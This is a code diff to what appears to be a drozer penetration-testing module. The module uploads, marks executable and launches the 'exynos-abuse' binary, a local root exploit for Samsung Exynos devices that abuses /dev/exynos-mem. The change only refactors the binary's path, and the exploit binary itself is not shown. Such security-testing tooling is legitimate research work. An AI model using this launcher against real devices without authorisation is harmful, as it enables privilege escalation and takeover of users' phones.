@@ -36,20 +36,22 @@ The provided exploit makes use of the fact that /dev/exynos-mem is marked as glo
             return False
 
     def exploit(self, arguments):
-        
+
+        exynos_abuse = os.path.join(self.workingDir(), "exynos-abuse")
+
         # Remove if it is there
-        self.shellExec("rm /data/data/com.mwr.dz/exynos-abuse")
+        self.shellExec("rm %s" % exynos_abuse)
         
         # Upload the exploit
         self.stdout.write("[*] Uploading exynos-abuse\n")
-        length = self.uploadFile(os.path.join(os.path.dirname(__file__), "exynos-abuse", "libs", "armeabi", "exynos-abuse"), "/data/data/com.mwr.dz/exynos-abuse")
+        length = self.uploadFile(os.path.join(os.path.dirname(__file__), "exynos-abuse", "libs", "armeabi", "exynos-abuse"), exynos_abuse)
 
         # Open shell and execute
         if length != None:
             self.stdout.write("[*] Upload successful\n")
-            self.stdout.write("[*] chmod 770 exynos-abuse\n")
-            self.shellExec("chmod 770 /data/data/com.mwr.dz/exynos-abuse")
+            self.stdout.write("[*] chmod 770 %s\n" % exynos_abuse)
+            self.shellExec("chmod 770 %s" % exynos_abuse)
             
-            self.shellStart("/data/data/com.mwr.dz/exynos-abuse")
+            self.shellStart(exynos_abuse)
         else:
             self.stderr.write("[*] Could not upload file\n")
